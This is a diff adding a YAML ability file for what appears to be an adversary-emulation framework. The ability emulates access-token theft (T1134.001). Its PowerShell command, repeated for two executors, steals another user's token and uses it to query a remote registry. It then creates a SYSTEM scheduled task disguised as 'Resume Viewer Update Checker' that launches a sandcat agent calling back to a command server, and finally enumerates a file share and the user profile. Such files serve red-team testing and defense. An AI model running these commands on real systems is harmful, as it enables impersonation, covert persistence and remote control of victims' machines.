@@ -1,0 +1,76 @@
+ability_id: 9fefcde6-083a-4440-8eca-dc03d30c0bcb
+access: {}
+additional_info: {}
+buckets:
+- defensive-evasion
+delete_payload: true
+description: "A token theft script was executed to steal and assume the token of another\
+  \ user\u2019s existing process, changing the user context of the process."
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'Import-Module .\StealToken.ps1 -Verbose -Force;
+
+    StealToken;
+
+    CreateProcessWithToken -CommandLine ''cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal
+    server"'';
+
+    CreateProcessWithToken -CommandLine ''cmd.exe /c schtasks /create /tn "Resume
+    Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM'';
+
+    CreateProcessWithToken -CommandLine ''cmd.exe /c dir /s /b #{remote.file.share}'';
+
+    CreateProcessWithToken -CommandLine ''cmd.exe /c tree %USERPROFILE%'';
+
+    RevertToSelf;'
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - StealToken.ps1
+  - sandcat.go-windows
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'Import-Module .\StealToken.ps1 -Verbose -Force;
+
+    StealToken;
+
+    CreateProcessWithToken -CommandLine ''cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal
+    server"'';
+
+    CreateProcessWithToken -CommandLine ''cmd.exe /c schtasks /create /tn "Resume
+    Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM'';
+
+    CreateProcessWithToken -CommandLine ''cmd.exe /c dir /s /b #{remote.file.share}'';
+
+    CreateProcessWithToken -CommandLine ''cmd.exe /c tree %USERPROFILE%'';
+
+    RevertToSelf;'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - StealToken.ps1
+  - sandcat.go-windows
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: File and Directory Discovery (T1083)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: defensive-evasion
+technique_id: T1134.001
+technique_name: 'Access Token Manipulation: Token Impersonation/Theft'
